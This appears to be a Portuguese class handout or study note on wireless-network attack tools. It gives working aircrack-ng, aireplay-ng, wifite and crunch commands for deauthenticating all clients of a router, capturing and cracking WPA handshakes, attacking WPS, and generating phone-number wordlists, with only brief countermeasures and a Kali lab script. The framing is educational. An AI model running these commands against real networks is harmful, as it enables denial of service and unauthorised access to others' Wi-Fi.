# Ferramentas de redes sem fio (802.11)

[[Fundamentos e conceitos de Redes Sem Fio]]

# Comandos de rede

# Linux

- ifconfig - visualiza e configura parâmetros de rede

# Windows

- ipconfig - visualiza e configura parâmetros de rede
- netsh wlan show interfaces //visualiza as interfaces de rede sem fio
- ferramenta Caim e Abel (cuidado ao instalar)

# Algumas ferramentas interessantes

- wifite (script em python muito fácil de usar)
- Aircrack-ng (mais utilizada no mundo)
- airgeddon (para ataques automatizados de evil twin)
- crunch (gerador de wordlist)
- wash (escanear roteadores com WPS ativado)
- reaver (explorar vulnerabilidades do protocolo WPS)
- bully (uma melhor implementação do reaver)
- kismet (auditoria de redes sem fio, inclui WIDS (Wireless Intrusion Detection System))
- karma (ferramenta para executar o Evil Twin pelo PNL (Preferred Network List)
- beholder (anti karma. Ferramenta para detectar anomalias em redes wifi)
- cowpatty (ferramenta para quebrar senha wifi com força bruta)
- mdk3 ()
- linset ()
- pyrit (para quebrar senhas usando a GPU)

# Wifite

Utilizar o —help ou man para aprender sobre a ferramenta

Digitar o comando `wifite` no terminal e seguir o menu apresentado

sudo wifite --wps-only --random-mac --skip-crack --power 35

# Suíte Aircrack-ng

***OBS**: os comandos devem ser executados no terminal de comandos como root*

Visualizar e analisar redes sem fio próximas

```python
airodump-ng wlan0
```

Para desautenticar todos os clientes de determinado roteador (para negação de serviço)

```python
iwconfig wlan0 channel 10 # para definir o canal do roteador escolhido
```

```python
aireplay-ng -0 0 -a 00:1A:3F:8D:57:42 wlan0
```

Ataque de força bruta na senha da rede

```python
airodump-ng wlan0 //para ver o canal do roteador e o endereço MAC
airodump-ng wlan0 --bssid 00:1A:3F:8D:57:42 -w testeHoje -c 8 //para salvar a captura em um arquivo
aireplay-ng -0 0 -a 00:1A:3F:8D:57:42 wlan0 //para derrubar clientes da rede
aircrack-ng testeHoje-03.cap -w /usr/share/wordlists/numeros8.txt

```

Aircrack para windows

[Aircrack-ng](https://www.aircrack-ng.org/)

# Algumas wordlists interessantes

- rockyou
- todos os números de telefone de 9 dígitos mas que começam com 999 ou 998 :
    
    crunch 9 9 0123456789 -t 998@@@@@@ -o celulares998.txt
    
    crunch 9 9 0123456789 -t 999@@@@@@ -o celulares999.txt
    

- números de telefone com ddd: crunch 11 11 0123456789 -t 22998@@@@@@ -o celulares22998.txt
    
    transformar todos os arquivos de texto em um
    
    cat celulares* > celulares.txt
    
- todos os números de 8 dígitos: crunch 8 8 0123456789 -o numeros8.txt
- além de todas as wordlists é interessante montar uma wordlist própria com as senhas mais utilizadas para wifi no próprio país.
    
    

# Ataques comuns em redes sem fio e medidas

- Negação de serviço (derrubar redes ou clientes) (medidas indefinidas)
- Ataque ao protocolo WPS (desabilitar protocolo WPS)
- Descoberta de senha por força bruta (senhas grandes e complexas)
- Descoberta de senha pelo ataque Evil Twin (medidas indefinidas)

# Roteiro da aula prática

1. Conectar placa wifi na porta USB do computador
2. Abrir a máquina virtual kali linux
3. Com a máquina aberta, ir no menu superior Dispositivos > USB > Atheros
4. Dar o comando `ifconfig` e verificar se aparece a interface wlan0
5. Caso dê algum problema no reconhecimento, tirar a placa e colocar de novo e fechar o kali e abrir de novo.
6. Seguir o tutorial do Aircrack-ng ou Wifite
7. Objetivo: Realizar os seguintes ataques abaixo